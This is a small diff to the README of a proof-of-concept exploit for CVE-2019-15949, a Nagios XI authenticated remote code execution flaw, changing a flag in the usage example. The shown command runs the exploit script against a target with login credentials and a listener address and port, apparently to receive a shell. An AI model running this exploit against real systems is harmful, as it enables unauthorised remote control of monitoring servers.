@@ -8,7 +8,7 @@ A proof-of-concept for CVE-2019–15949 Nagiosxi Authenticated RCE
 
 * With python3
 ```
-python3 exploit.py -t 'http://nagios.xi/' -d /nagiosxi/ -u username -p password -lh 127.0.0.1 -lp 1337
+python3 exploit.py -t 'http://nagios.xi/' -b /nagiosxi/ -u username -p password -lh 127.0.0.1 -lp 1337
 ```
 
 ## Help
